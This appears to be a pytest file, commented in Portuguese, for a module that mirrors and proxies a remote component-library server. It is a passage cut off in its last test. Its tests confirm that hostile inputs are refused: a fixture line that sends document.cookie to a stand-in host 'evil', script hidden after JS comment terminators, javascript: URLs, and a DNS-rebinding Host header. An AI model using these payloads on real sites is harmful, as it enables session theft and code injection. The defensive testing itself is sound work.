# -*- coding: utf-8 -*-
"""Biblioteca remota (libremota.py): o hub do desktop com o servidor como UNICA biblioteca.

    python3 -m pytest tests/test_libremota.py -q

Um "servidor" falso roda numa thread (werkzeug make_server, porta 18500-18599) imitando o
hub central: /Libs/<f> com ETag/304, /__events, /api/symbols/* (inclusive o stream do
almox-sync com o 'done'), /api/save e /api/almox/config. O app do hubserver roda pelo
test_client em modo remoto sobre uma pasta temporaria -- H.ROOT e o ROOT do symserver sao
trocados, e a Libs/ de verdade e conferida no fim (nada pode ter sido escrito nela).

Prova: repasse de POST com o corpo cru, metodo, query e Content-Type; o espelho atualizado
ANTES da resposta do POST; o stream repassado evento a evento, com o refresh antes do 'done';
/api/save de projeto local e o do lib-subs.js no servidor; a rota legada /api/almox/sync
recusada; servidor fora -> POST 503 e GET caindo no handler local; .js com codigo, var
desconhecida e .SchLib sem assinatura recusados; ETag/304; backup do arquivo local que o
servidor nao tem (e nao da semente do app); 404 em HTML virando a mensagem de versao; o
/__events do servidor puxando o refresh sozinho; e, sem a variavel, nada muda. E mais:
codigo escondido atras de um // que acaba em \\r, U+2028 ou U+2029 recusado; Host fora do
TRUSTED_HOSTS com o 400 de sempre, sem nada repassado; a leitura do lib-subs.js vindo do
servidor e a gravacao sobre uma leitura velha recusada (409) em vez de apagar a escolha do
outro PC; e a volta do servidor pedindo o refresh do espelho na hora.
"""
import hashlib
import json
import os
import shutil
import socket
import sys
import threading
import time

import pytest
from flask import Flask, Response, request
from werkzeug.serving import make_server

RAIZ = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, RAIZ)
sys.path.insert(0, os.path.join(RAIZ, 'tools', 'symbols'))

import hubserver as H            # noqa: E402  (registra o libremota e o blueprint symbols)
import libremota as R            # noqa: E402
import symserver as S            # noqa: E402

CFBF = b'\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1'

BASE_SERVIDOR = {
    'schlib.js': b'var schlib = {"symbols":[{"name":"RES"}]};\n',
    'symbols-lib.js': b'var symbolsLib = {"symbols":[{"id":"s0001","name":"do servidor"}]};\n',
    'lib-subs.js': b'var libSubs = [];\n',
    'rename-map.js': b'var renameMap = {"symRename":{}};\n',
    'pcblib.js': b'var pcblib = {"footprints":[{"name":"R0805"}]};\n',
    'almox-basicos.js': b'var almoxBasicos = {"familias":[],"rodada":1};\n',
    'almox-index.js': b'var almoxIndex = {"odooUrl":"http://localhost:8070/odoo"};\n',
    'almox-parts.json': b'{"ids":{"A":1}}',
    'lib-ledger.json': b'{"protegidos":{}}',
    'libs-report.txt': b'relatorio do servidor\n',
    'BIBLIOTECA DE ESQUEMA.SchLib': CFBF + b'\x00' * 64,
    # almox-especiais.js, almox-sync.js, almox-guardiao.js e almox-excluidos.json: o
    # servidor nao tem (404), e o local fica
}


def _sha(b):
    return hashlib.sha1(b).hexdigest()


class Falso:
    """O hub central de mentira. Guarda o que recebeu para o teste conferir."""

    def __init__(self):
        self.parar = threading.Event()
        self.app = self._monta()
        self.srv = None
        self.reinicia()

    def reinicia(self):
        self.libs = dict(BASE_SERVIDOR)
        self.pedidos = []             # (metodo, caminho, corpo, content-type)
        self.n_libs = 0               # GETs em /Libs/ (o refresh e a leitura do lib-subs.js)
        self.n304 = 0
        self.etag_fixo = None         # o ETag do Werkzeug e mtime-tamanho: pode nao mudar
        self.versao = 0
        self.portao = threading.Event()
        self.portao_esgotou = False

    def muda(self, nome, dados):
        self.libs[nome] = dados
        self.versao += 1

    def _monta(self):
        app = Flask('falso')
        f = self

        @app.before_request
        def anota():
            if not request.path.startswith(('/Libs/', '/__events')):
                f.pedidos.append((request.method, request.full_path.rstrip('?'),
                                  request.get_data(), request.headers.get('Content-Type')))

        @app.route('/Libs/<path:nome>', methods=['GET', 'HEAD'])
        def libs(nome):
            f.n_libs += 1
            if nome not in f.libs:
                return Response('<h1>Not Found</h1>', status=404, content_type='text/html')
            dados = f.libs[nome]
            etag = f.etag_fixo or '"%s"' % _sha(dados)
            if request.headers.get('If-None-Match') == etag:
                f.n304 += 1
                return Response(status=304, headers={'ETag': etag})
            return Response(dados, headers={'ETag': etag}, content_type='application/octet-stream')

        @app.route('/__live.js', methods=['GET', 'HEAD'])
        def live():
            return Response('new EventSource("/__events")', content_type='text/javascript')

        @app.route('/__events')
        def eventos():
            def gera():
                visto = f.versao
                ultimo = time.time()
                while not f.parar.is_set():
                    time.sleep(0.05)
                    if f.versao != visto:
                        visto = f.versao
                        yield 'event: change\ndata: %d\n\n' % visto
                    elif time.time() - ultimo > 1:
                        ultimo = time.time()
                        yield ': keep-alive\n\n'
            return Response(gera(), content_type='text/event-stream')

        @app.route('/api/symbols/eco', methods=['GET', 'POST', 'PUT', 'DELETE'])
        def eco():
            return {'ok': True, 'metodo': request.method, 'args': request.args.to_dict(),
                    'corpo': request.get_data(as_text=True),
                    'tipo': request.headers.get('Content-Type'),
                    'accept': request.headers.get('Accept')}

        @app.route('/api/symbols/save', methods=['POST'])
        def save():
            d = request.get_json()
            f.muda('schlib.js', ('var schlib = {"symbols":[{"name":%s}]};\n'
                                 % json.dumps(d['name'])).encode('utf-8'))
            return {'ok': True, 'espelho': True}

        @app.route('/api/symbols/lib', methods=['POST'])
        def lib():
            f.muda('symbols-lib.js', b'var symbolsLib = {"symbols":[{"id":"s0002"}]};\n')
            return {'ok': True}

        @app.route('/api/symbols/almox-excluidos')
        def excluidos():
            return {'ok': True, 'itens': [{'de': 'servidor'}]}

        @app.route('/api/symbols/almox-sync', methods=['POST'])
        def sync():
            return {'runId': 'g_0001'}, 202

        @app.route('/api/symbols/almox-sync/<run_id>/stream')
        def sync_stream(run_id):
            def gera():
                yield 'data: regerando do snapshot em disco\n\n'
                # so segue quando o teste disser que JA recebeu o evento acima: se o repasse
                # bufferizasse, o teste nunca o receberia sozinho e o portao esgotaria
                if not f.portao.wait(10):
                    f.portao_esgotou = True
                f.muda('almox-basicos.js', b'var almoxBasicos = {"familias":[],"rodada":2};\n')
                yield 'event: done\ndata: {"ok": true, "resumo": {}}\n\n'
            return Response(gera(), content_type='text/event-stream')

        @app.route('/api/save', methods=['POST'])
        def save_generico():
            d = request.get_json()
            if d.get('path') == 'Libs/lib-subs.js':
                f.muda('lib-subs.js', d['content'].encode('utf-8'))
            return {'ok': True}

        @app.route('/api/almox/config', methods=['GET'])
        def cfg_get():
            return {'ok': True, 'config': {'url': 'http://odoo', 'db': 'odoo_db', 'login': 'x',
                                           'temSenha': True}, 'local': False, 'script': True}

        @app.route('/api/almox/config', methods=['POST'])
        def cfg_set():
            return {'ok': False, 'error': 'as credenciais do Odoo so mudam no PC do servidor'}, 403

        # a rota curinga GET do hubserver (/<path:path>): e ela que faz um POST numa rota que
        # o servidor nao tem dar 405, e nao 404 -- o que um hub de verdade responde
        @app.route('/<path:resto>')
        def curinga(resto):
            return Response('<h1>Not Found</h1>', status=404, content_type='text/html')

        return app

    def sobe(self):
        for porta in range(18500, 18600):
            if not _porta_livre(porta):
                continue
            try:
                self.srv = make_server('127.0.0.1', porta, self.app, threaded=True)
                break
            except OSError:
                continue
        assert self.srv is not None, 'nenhuma porta livre em 18500-18599'
        self.url = 'http://127.0.0.1:%d' % self.srv.server_port
        threading.Thread(target=self.srv.serve_forever, daemon=True).start()

    def desce(self):
        self.parar.set()
        self.srv.shutdown()


def _porta_livre(porta):
    """Ninguem escuta nela? O make_server do werkzeug liga com SO_REUSEADDR, e no Windows isso
    deixa ligar POR CIMA de um servidor que ja esta la: os pedidos do teste iam parar no outro
    processo (medido, com um hub de smoke de pe na 18500). O bind exclusivo tira a duvida."""
    s = socket.socket()
    try:
        if hasattr(socket, 'SO_EXCLUSIVEADDRUSE'):
            s.setsockopt(socket.SOL_SOCKET, socket.SO_EXCLUSIVEADDRUSE, 1)
        s.bind(('127.0.0.1', porta))
        return True
    except OSError:
        return False
    finally:
        s.close()


def _porta_fechada():
    """Uma porta da faixa de teste em que ninguem escuta: conexao recusada na hora."""
    for porta in range(18599, 18499, -1):
        if _porta_livre(porta):
            return 'http://127.0.0.1:%d' % porta
    raise AssertionError('nenhuma porta livre em 18500-18599')


def _foto_libs():
    fora = {}
    for raiz, _dirs, files in os.walk(os.path.join(RAIZ, 'Libs')):
        for nome in files:
            p = os.path.join(raiz, nome)
            try:
                st = os.stat(p)
                fora[p] = (st.st_size, st.st_mtime_ns)
            except OSError:
                fora[p] = None
    return fora


def _le(root, nome):
    with open(os.path.join(root, 'Libs', nome), 'rb') as f:
        return f.read()


def _grava(root, rel, dados):
    p = os.path.join(root, *rel.split('/'))
    os.makedirs(os.path.dirname(p), exist_ok=True)
    with open(p, 'wb') as f:
        f.write(dados)


@pytest.fixture(scope='module', autouse=True)
def libs_reais_intocadas():
    antes = _foto_libs()
    yield
    depois = _foto_libs()
    mexidos = sorted(set(antes) ^ set(depois)) + sorted(p for p in set(antes) & set(depois)
                                                       if antes[p] != depois[p])
    assert not mexidos, 'o teste escreveu na Libs/ de verdade: ' + ', '.join(mexidos)


@pytest.fixture(scope='module')
def falso():
    f = Falso()
    f.sobe()
    yield f
    f.desce()


@pytest.fixture
def ws(tmp_path):
    """Um workspace temporario servido pelo hubserver (H.ROOT e o ROOT do symserver)."""
    root = str(tmp_path / 'ws')
    for d in ('Libs', os.path.join('Projects', 'P1')):
        os.makedirs(os.path.join(root, d))
    _grava(root, 'Libs/almox-excluidos.json', json.dumps(
        {'format': S.A.FORMATO_EXCLUIDOS, 'atualizado': '', 'itens': [{'de': 'local'}]}).encode('utf-8'))
    _grava(root, 'Libs/lib-subs.js', b'var libSubs = [{"kind":"sym","from":"local","to":"RES"}];\n')
    reais = H.ROOT, S.ROOT
    H.ROOT = S.ROOT = root
    try:
        yield root
    finally:
        H.ROOT, S.ROOT = reais
        R.configura(RAIZ, None)


@pytest.fixture
def remoto(ws, falso):
    falso.reinicia()
    r = R.configura(ws, falso.url)
    assert r is not None and R.atual() is r
    return r


cli = H.app.test_client()


# ─── url e validacao ───────────────────────────────────────────────────────────
def test_url_normalizada_ou_recusada():
    assert R.normaliza_url('http://192.168.15.192:8100/') == 'http://192.168.15.192:8100'
    assert R.normaliza_url('  https://hub.lan  ') == 'https://hub.lan'
    for ruim in ('', None, 'ftp://x', '192.168.15.192:8100', 'http://', 'http://h:abc',
                 'http://h/?q=1', 'javascript:alert(1)'):
        assert R.normaliza_url(ruim) is None, ruim


def test_recusa_de_dado():
    assert R.recusa('schlib.js', b'// cabecalho\nvar schlib = {"a":[1,2,],};\n') == ''
    assert R.recusa('lib-subs.js', b'\xef\xbb\xbfvar libSubs = [];') == ''
    assert 'JSON puro' in R.recusa('lib-subs.js', b'var libSubs = []; fetch("http://x")')
    assert 'JSON puro' in R.recusa('lib-subs.js', b'var libSubs = [NaN];')
    assert 'var <nome>' in R.recusa('lib-subs.js', b'var location = "javascript:alert(1)";')
    assert 'var <nome>' in R.recusa('schlib.js', b'alert(1); var schlib = {};')
    assert R.recusa('almox-parts.json', b'{"ids":{}}') == ''
    assert 'JSON' in R.recusa('almox-parts.json', b'{"ids":')
    assert R.recusa('BIBLIOTECA DE ESQUEMA.SchLib', CFBF + b'x') == ''
    assert 'CFBF' in R.recusa('BIBLIOTECA DE ESQUEMA.SchLib', b'<html>')
    assert R.recusa('libs-report.txt', b'qualquer coisa') == ''


# O // do JS acaba em \n, \r, U+2028 e U+2029. Uma validacao que so corta no \n apaga a linha
# inteira e aceita o que o navegador executa depois do terminador.
ESCONDIDOS = [('var libSubs = [];\n// nota' + sep + 'window.PWNED=1;\n').encode('utf-8')
              for sep in ('\r', ' ', ' ')]


def test_recusa_codigo_escondido_depois_de_comentario():
    for dados in ESCONDIDOS:
        assert 'JSON puro' in R.recusa('lib-subs.js', dados), dados
    # o mesmo no cabecalho, antes do var
    for sep in ('\r', ' ', ' '):
        dados = ('// gerado' + sep + 'window.PWNED=1;\nvar libSubs = [];\n').encode('utf-8')
        assert R.recusa('lib-subs.js', dados) != '', repr(sep)
    # comentario de verdade continua aceito, com \n ou \r\n, no cabecalho ou no fim
    assert R.recusa('lib-subs.js', b'// cabecalho\r\nvar libSubs = [];\r\n') == ''
    assert R.recusa('lib-subs.js', b'// a\n  // b\nvar libSubs = [];\n// fim') == ''
    # U+2028 dentro de uma string JSON e dado, nao terminador de comentario
    assert R.recusa('lib-subs.js', 'var libSubs = ["a b"];\n'.encode('utf-8')) == ''


def test_codigo_escondido_nao_chega_ao_espelho(remoto, falso, ws):
    for dados in ESCONDIDOS:
        falso.libs['lib-subs.js'] = dados
        antes = _le(ws, 'lib-subs.js')
        assert remoto.refresh() is True
        assert _le(ws, 'lib-subs.js') == antes, dados
        assert 'lib-subs.js recusado' in cli.get('/api/lib-remota/status').get_json()['erro']
        # nem pela leitura do lib-subs.js, que busca o arquivo no servidor antes de servir
        assert b'PWNED' not in cli.get('/Libs/lib-subs.js').data


# ─── sem a variavel ────────────────────────────────────────────────────────────
def test_sem_variavel_nada_muda(ws, falso):
    falso.reinicia()
    assert R.configura(ws, None) is None and R.configura(ws, '') is None
    assert cli.get('/api/lib-remota/status').get_json() == {'ok': True, 'modo': 'local'}
    r = cli.get('/api/symbols/almox-excluidos')
    assert r.status_code == 200 and r.get_json()['itens'] == [{'de': 'local'}]
    # a rota legada continua sendo do hub local (aqui responde, nao e o 409 do modo remoto)
    assert cli.post('/api/almox/sync', json={}).status_code != 409
    r = cli.post('/api/save', json={'path': 'Libs/lib-subs.js', 'content': 'var libSubs = [];\n'})
    assert r.status_code == 200 and _le(ws, 'lib-subs.js') == b'var libSubs = [];\n'
    assert falso.pedidos == [], 'sem a variavel nada vai ao servidor'
    assert not os.path.exists(os.path.join(ws, '.lib-remota'))


def test_url_invalida_fica_local(ws):
    assert R.configura(ws, 'ftp://192.168.15.192') is None
    assert cli.get('/api/lib-remota/status').get_json()['modo'] == 'local'


# ─── espelho ───────────────────────────────────────────────────────────────────
def test_refresh_espelha_valida_e_usa_etag(remoto, falso, ws):
    assert remoto.refresh() is True
    for nome in ('schlib.js', 'symbols-lib.js', 'pcblib.js', 'almox-parts.json',
                 'BIBLIOTECA DE ESQUEMA.SchLib', 'libs-report.txt'):
        assert _le(ws, nome) == falso.libs[nome], nome
    # o loopback do servidor no almox-index.js vira o host do servidor
    assert _le(ws, 'almox-index.js') == b'var almoxIndex = {"odooUrl":"http://127.0.0.1:8070/odoo"};\n'
    # o que o servidor nao tem: o local fica
    assert json.loads(_le(ws, 'almox-excluidos.json'))['itens'] == [{'de': 'local'}]
    st = cli.get('/api/lib-remota/status').get_json()
    assert st['modo'] == 'remota' and st['online'] is True and st['servidor'] == falso.url
    assert st['ultimaSincronia'] and st['erro'] == ''
    assert set(st['ausentes']) == {'almox-especiais.js', 'almox-sync.js', 'almox-guardiao.js',
                                   'almox-excluidos.json'}
    # estado persistido fora de Libs/ (pasta com ponto: o hubserver nao a serve)
    est = json.load(open(os.path.join(ws, '.lib-remota', 'estado.json'), encoding='utf-8'))
    assert est['servidor'] == falso.url and est['arquivos']['schlib.js']['etag']
    assert cli.get('/.lib-remota/estado.json').status_code == 404
    # segunda rodada: tudo 304, nada regravado
    mtimes = {n: os.stat(os.path.join(ws, 'Libs', n)).st_mtime_ns for n in est['arquivos']}
    assert remoto.refresh() is True
    assert falso.n304 == len(est['arquivos'])
    assert mtimes == {n: os.stat(os.path.join(ws, 'Libs', n)).st_mtime_ns for n in est['arquivos']}


def test_recusa_js_com_codigo(remoto, falso, ws):
    falso.libs['lib-subs.js'] = b'var libSubs = []; fetch("http://evil/" + document.cookie);\n'
    falso.libs['rename-map.js'] = b'var location = "javascript:alert(1)";\n'
    falso.libs['BIBLIOTECA DE ESQUEMA.SchLib'] = b'<html>nao sou uma SchLib</html>'
    antes = _le(ws, 'lib-subs.js')
    assert remoto.refresh() is True
    assert _le(ws, 'lib-subs.js') == antes, 'arquivo recusado nao e gravado'
    assert not os.path.exists(os.path.join(ws, 'Libs', 'rename-map.js'))
    assert not os.path.exists(os.path.join(ws, 'Libs', 'BIBLIOTECA DE ESQUEMA.SchLib'))
    erro = cli.get('/api/lib-remota/status').get_json()['erro']
    assert 'lib-subs.js recusado' in erro and 'rename-map.js recusado' in erro and 'CFBF' in erro
    assert _le(ws, 'schlib.js') == falso.libs['schlib.js'], 'o resto entra normalmente'


def test_backup_do_local_que_o_servidor_nao_tem(remoto, falso, ws):
    _grava(ws, 'Libs/symbols-lib.js', b'var symbolsLib = {"symbols":[],"excluidos":["feito no desktop"]};\n')
    _grava(ws, 'Libs/schlib.js', falso.libs['schlib.js'])            # igual ao servidor
    _grava(ws, 'Libs/lib-subs.js', falso.libs['lib-subs.js'])        # idem
    assert remoto.refresh() is True
    assert _le(ws, 'symbols-lib.js') == falso.libs['symbols-lib.js']
    st = cli.get('/api/lib-remota/status').get_json()
    assert [b['arquivo'] for b in st['backups']] == ['Libs/symbols-lib.js'], st['backups']
    b = st['backups'][0]
    assert b['para'].startswith('.lib-remota/backup/lib-remota-') and b['para'].endswith('/Libs/symbols-lib.js')
    with open(os.path.join(ws, *b['para'].split('/')), 'rb') as fh:
        assert b'feito no desktop' in fh.read()
    # o espelho gravou; mexer de novo so por fora do espelho gera outro backup, e o que o
    # proprio espelho gravou (inalterado) nao gera
    falso.muda('symbols-lib.js', b'var symbolsLib = {"symbols":[{"id":"s0009"}]};\n')
    assert remoto.refresh() is True
    assert len(cli.get('/api/lib-remota/status').get_json()['backups']) == 1


def test_estado_na_pasta_do_app_e_semente_sem_backup(ws, falso):
    falso.reinicia()
    semente = b'var pcblib = {"footprints":[{"name":"da semente do instalador"}]};\n'
    importado = b'var schlib = {"symbols":[{"name":"do import antigo"}]};\n'
    _grava(ws, 'Libs/pcblib.js', semente)
    _grava(ws, 'Libs/schlib.js', importado)
    os.remove(os.path.join(ws, 'Libs', 'lib-subs.js'))                # sem local: so grava
    _grava(ws, '.altiumhub/seed.json', json.dumps({'Libs/pcblib.js': [_sha(semente)]}).encode())
    _grava(ws, '.altiumhub/import-state.json', json.dumps(
        {'files': {'Libs/schlib.js': {'sha1': 'x', 'localSha1': _sha(importado)}}}).encode())
    r = R.configura(ws, falso.url)
    assert r.arq_estado == os.path.join(ws, '.altiumhub', 'lib-remota.json')
    assert r.refresh() is True
    assert _le(ws, 'pcblib.js') == falso.libs['pcblib.js']
    assert _le(ws, 'schlib.js') == falso.libs['schlib.js']
    assert r.status()['backups'] == [], 'bytes que o proprio app pos nao sao trabalho de ninguem'
    assert os.path.isfile(os.path.join(ws, '.altiumhub', 'lib-remota.json'))
    assert not os.path.exists(os.path.join(ws, '.lib-remota'))


# ─── repasse ───────────────────────────────────────────────────────────────────
def test_repasse_de_post_com_corpo_cru_e_query(remoto, falso):
    corpo = '{"a": [1, 2],   "b": "acentuação"}'
    r = cli.post('/api/symbols/eco?x=1&y=dois', data=corpo.encode('utf-8'),
                 content_type='application/json; charset=utf-8', headers={'Accept': 'application/json'})
    assert r.status_code == 200
    j = r.get_json()
    assert j['metodo'] == 'POST' and j['args'] == {'x': '1', 'y': 'dois'}
    assert j['corpo'] == corpo, 'o corpo vai cru, byte a byte'
    assert j['tipo'] == 'application/json; charset=utf-8' and j['accept'] == 'application/json'
    assert cli.put('/api/symbols/eco', data=b'').get_json()['metodo'] == 'PUT'
    assert cli.get('/api/symbols/almox-excluidos').get_json()['itens'] == [{'de': 'servidor'}]


def test_refresh_sincrono_depois_do_post(remoto, falso, ws):
    assert remoto.refresh() is True
    r = cli.post('/api/symbols/save', json={'name': 'NOVO NO SERVIDOR'})
    assert r.status_code == 200 and r.get_json()['espelho'] is True
    # a resposta so saiu depois de o espelho ter o que o servidor gravou
    assert b'NOVO NO SERVIDOR' in _le(ws, 'schlib.js')
    r = cli.post('/api/symbols/lib', json={'op': 'add'})
    assert r.status_code == 200 and b's0002' in _le(ws, 'symbols-lib.js')


def test_stream_evento_a_evento_e_refresh_antes_do_done(remoto, falso, ws):
    assert remoto.refresh() is True
    r = cli.post('/api/symbols/almox-sync', json={'pull': False})
    assert r.status_code == 202 and r.get_json()['runId'] == 'g_0001'
    resp = cli.get('/api/symbols/almox-sync/g_0001/stream', buffered=False,
                   headers={'Accept': 'text/event-stream'})
    assert resp.status_code == 200 and resp.mimetype == 'text/event-stream'
    it = iter(resp.response)
    primeiro = next(it)
    assert b'regerando do snapshot' in primeiro and b'done' not in primeiro
    assert b'"rodada":1' in _le(ws, 'almox-basicos.js'), 'o servidor ainda nao terminou'
    falso.portao.set()
    segundo = next(it)
    assert b'event: done' in segundo
    # a pagina recarrega a biblioteca ao receber o done: o espelho ja tem de estar la
    assert b'"rodada":2' in _le(ws, 'almox-basicos.js')
    assert falso.portao_esgotou is False, 'o primeiro evento chegou antes do fim do stream'
    resp.close()


def test_save_de_projeto_fica_local_e_o_lib_subs_vai(remoto, falso, ws):
    assert remoto.refresh() is True             # o espelho de subida (o lib-subs local era outro)
    r = cli.post('/api/save', json={'path': 'Projects/P1/schematic.js', 'content': 'var schematic = {};\n'})
    assert r.status_code == 200
    with open(os.path.join(ws, 'Projects', 'P1', 'schematic.js'), encoding='utf-8') as fh:
        assert fh.read() == 'var schematic = {};\n'
    assert [p for p in falso.pedidos if p[1].startswith('/api/save')] == []
    novo = 'var libSubs = [{"kind":"sym","from":"R1","to":"RES"}];\n'
    r = cli.post('/api/save', json={'path': 'Libs/lib-subs.js', 'content': novo})
    assert r.status_code == 200
    assert [p[1] for p in falso.pedidos if p[1].startswith('/api/save')] == ['/api/save']
    assert _le(ws, 'lib-subs.js') == novo.encode('utf-8'), 'voltou pelo espelho antes da resposta'


def test_rota_legada_recusada(remoto, falso):
    r = cli.post('/api/almox/sync', json={'pull': True})
    assert r.status_code == 409 and 'Sincronizar almoxarifado' in r.get_json()['error']
    assert cli.get('/api/almox/sync/a_0001/stream').status_code == 409
    assert falso.pedidos == []


def test_almox_config_e_do_servidor(remoto, falso):
    j = cli.get('/api/almox/config').get_json()
    assert j['local'] is False and j['config']['db'] == 'odoo_db'
    r = cli.post('/api/almox/config', json={'senha': 'x'})
    assert r.status_code == 403 and 'PC do servidor' in r.get_json()['error']


def test_404_em_html_vira_mensagem_de_versao(remoto, falso):
    for metodo, rota in (('get', '/api/symbols/lib-vinculos'), ('post', '/api/symbols/almox-aplicar')):
        # o POST chega no servidor como 405 (a curinga GET casa a url), e vira a mesma mensagem
        r = getattr(cli, metodo)(rota, json={} if metodo == 'post' else None)
        assert r.status_code == 404 and r.is_json, rota
        err = r.get_json()['error']
        assert rota in err and 'versao mais antiga' in err, err


def test_nao_repassa_um_repasse(remoto, falso):
    r = cli.get('/api/symbols/almox-excluidos', headers={R.CAB_REPASSE: '1'})
    assert r.get_json()['itens'] == [{'de': 'local'}]
    assert falso.pedidos == []


def test_host_fora_da_lista_nao_e_repassado(remoto, falso):
    """Com o hub so no loopback, Host fora do TRUSTED_HOSTS e 400 antes de qualquer rota (o
    anti DNS rebinding do configura_escuta). O repasse roda no before_request, antes do
    dispatch que levanta esse 400: sem a guarda, um dominio que resolve para 127.0.0.1 lia e
    gravava a biblioteca do servidor atraves deste hub."""
    guardado = H.app.config.get('TRUSTED_HOSTS'), H._ESCUTA_REDE
    H.configura_escuta('127.0.0.1')
    try:
        fora = {'base_url': 'http://rebind.atacante.example:8200'}
        pedidos = (('get', '/api/symbols/almox-excluidos', {}),
                   ('post', '/api/symbols/save', {'json': {'name': 'DO ATACANTE'}}),
                   ('post', '/api/save', {'json': {'path': 'Libs/lib-subs.js',
                                                    'content': 'var libSubs = [];\n'}}),
                   ('get', '/Libs/lib-subs.js', {}),
                   ('get', '/api/almox/config', {}),
                   ('post', '/api/almox/sync', {'json': {}}))
        for metodo, rota, kw in pedidos:
            r = getattr(cli, metodo)(rota, **fora, **kw)
            assert r.status_code == 400, (rota, r.status_code)
        assert falso.pedidos == [] and falso.n_libs == 0, 'nada pode ter chegado ao servidor'
        # o Host legitimo continua repassado
        assert cli.get('/api/symbols/almox-excluidos').get_json()['itens'] == [{'de': 'servidor'}]
    finally:
        H.app.config['TRUSTED_HOSTS'], H._ESCUTA_REDE = guardado


# ─── lib-subs.js: ler e gravar no mesmo lugar ──────────────────────────────────
DO_OUTRO_PC = b'var libSubs = [{"kind":"sym","from":"OUTRO","to":"RES"}];\n'


def _escolha(base, de):
    """O que o libSetSub faz: le o arquivo, junta a escolha e devolve o arquivo inteiro."""
    lista = json.loads(base.decode('utf-8').split('=', 1)[1].strip().rstrip(';'))
    lista.append({'kind': 'sym', 'from': de, 'to': 'RES'})
    return 'var libSubs = %s;\n' % json.dumps(lista)


def test_leitura_do_lib_subs_vem_do_servidor(remoto, falso, ws):
    assert remoto.refresh() is True
    falso.libs['lib-subs.js'] = DO_OUTRO_PC     # o espelho ainda nao viu
    r = cli.get('/Libs/lib-subs.js')
    assert r.status_code == 200 and r.data == DO_OUTRO_PC
    assert _le(ws, 'lib-subs.js') == DO_OUTRO_PC, 'a leitura passou pelo espelho'
    # a escolha feita sobre essa leitura grava sem apagar a do outro PC
    r = cli.post('/api/save', json={'path': 'Libs/lib-subs.js', 'content': _escolha(r.data, 'MEU')})
    assert r.status_code == 200, r.get_json()
    assert b'OUTRO' in falso.libs['lib-subs.js'] and b'MEU' in falso.libs['lib-subs.js']
    # sem If-None-Match: o ETag do servidor de verdade e mtime-tamanho, e um arquivo regravado
    # com o mesmo tamanho no mesmo segundo o repete -- um 304 ali serviria a copia velha
    falso.etag_fixo = '"1788894253.0-60-123"'
    assert remoto.refresh() is True
    igual = falso.libs['lib-subs.js'].replace(b'MEU', b'MEX')
    falso.libs['lib-subs.js'] = igual
    assert cli.get('/Libs/lib-subs.js').data == igual


def test_gravacao_sobre_leitura_velha_e_recusada(remoto, falso, ws):
    """A pagina leu o espelho (servidor fora havia pouco: a leitura nao espera 3 s) e o
    servidor ganhou uma escolha nesse meio tempo. Gravar o arquivo inteiro por cima a apagaria
    calada; o repasse confere antes e devolve 409, e o espelho fica com a do servidor."""
    assert remoto.refresh() is True
    remoto._marca_fora('teste')                 # a leitura vai direto ao espelho
    velho = cli.get('/Libs/lib-subs.js').data
    assert velho == BASE_SERVIDOR['lib-subs.js']
    falso.libs['lib-subs.js'] = DO_OUTRO_PC     # feito durante a queda, por outro PC
    r = cli.post('/api/save', json={'path': 'Libs/lib-subs.js', 'content': _escolha(velho, 'MEU')})
    assert r.status_code == 409, r.get_json()
    assert 'outro PC gravou' in r.get_json()['error']
    assert falso.libs['lib-subs.js'] == DO_OUTRO_PC, 'a escolha do outro PC continua no servidor'
    assert [p for p in falso.pedidos if p[1] == '/api/save'] == [], 'o POST nao foi repassado'
    assert _le(ws, 'lib-subs.js') == DO_OUTRO_PC, 'o espelho ja tem a versao do servidor'
    # refeita sobre a versao nova, a escolha grava e as duas ficam
    base = cli.get('/Libs/lib-subs.js').data
    r = cli.post('/api/save', json={'path': 'Libs/lib-subs.js', 'content': _escolha(base, 'MEU')})
    assert r.status_code == 200
    assert b'OUTRO' in falso.libs['lib-subs.js'] and b'MEU' in falso.libs['lib-subs.js']


def test_lib_subs_com_servidor_fora_serve_o_espelho(ws):
    R.configura(ws, _porta_fechada())
    antes = _le(ws, 'lib-subs.js')
    r = cli.get('/Libs/lib-subs.js')
    assert r.status_code == 200 and r.data == antes
    assert R.atual().online is False


# ─── a volta do servidor ───────────────────────────────────────────────────────
def test_volta_do_servidor_pede_refresh(remoto, falso):
    """Quem percebe a volta e o primeiro repasse que da certo: o status passa a online (a
    pagina avisa "gravacao liberada") e o espelho tem de vir junto, sem esperar a thread do
    /__events sair do backoff e o primeiro keep-alive do servidor."""
    assert remoto.refresh() is True
    remoto._marca_fora('teste')
    remoto._fora_em = 0                         # passou o T_RETESTE: o GET tenta o servidor
    remoto._pedido.clear()
    assert cli.get('/api/symbols/almox-excluidos').get_json()['itens'] == [{'de': 'servidor'}]
    assert remoto.online is True and remoto._pedido.is_set(), 'a virada nao pediu refresh'
    # online -> online nao pede nada
    remoto._pedido.clear()
    cli.get('/api/symbols/almox-excluidos')
    assert not remoto._pedido.is_set()
    # o refresh que marca online e a propria atualizacao: nao pede outro
    remoto._marca_fora('teste')
    assert remoto.refresh() is True and remoto.online is True
    assert not remoto._pedido.is_set()


def test_volta_do_servidor_atualiza_o_espelho_com_as_threads(remoto, falso, ws):
    remoto.inicia()
    try:
        limite = time.time() + 10
        while time.time() < limite and not os.path.exists(os.path.join(ws, 'Libs', 'schlib.js')):
            time.sleep(0.05)
        assert _le(ws, 'schlib.js') == falso.libs['schlib.js']
        # a subida e o /__events assentam: os cabecalhos vem no primeiro keep-alive (1 s aqui),
        # e o refresh que a conexao pede vem depois do debounce
        time.sleep(3.0)
        # mudou no servidor durante a queda, sem 'change' que chegue ate aqui
        novo = b'var schlib = {"symbols":[{"name":"FEITO NA QUEDA"}]};\n'
        falso.libs['schlib.js'] = novo
        remoto._marca_fora('teste')
        remoto._fora_em = 0
        # com as threads no ar a leitura confia no "fora" e vai ao espelho sem tentar o servidor
        n = len(falso.pedidos)
        assert cli.get('/api/symbols/almox-excluidos').get_json()['itens'] == [{'de': 'local'}]
        assert len(falso.pedidos) == n, 'a leitura tentou o servidor mesmo com ele marcado fora'
        # quem desfaz o "fora" e o /__events, no proximo keep-alive, e a virada pede o refresh
        limite = time.time() + 5                # o periodico so viria em 60 s
        while time.time() < limite and _le(ws, 'schlib.js') != novo:
            time.sleep(0.05)
        assert _le(ws, 'schlib.js') == novo, 'o espelho ficou com a copia de antes da queda'
    finally:
        remoto.para()


def test_volta_do_servidor_pela_sonda(ws):
    """Servidor fora com as threads no ar: a leitura vai ao espelho sem tentar conectar, e a
    volta aparece pela sonda do _laco_eventos (no maximo BACKOFF_MAX), nao pelo primeiro
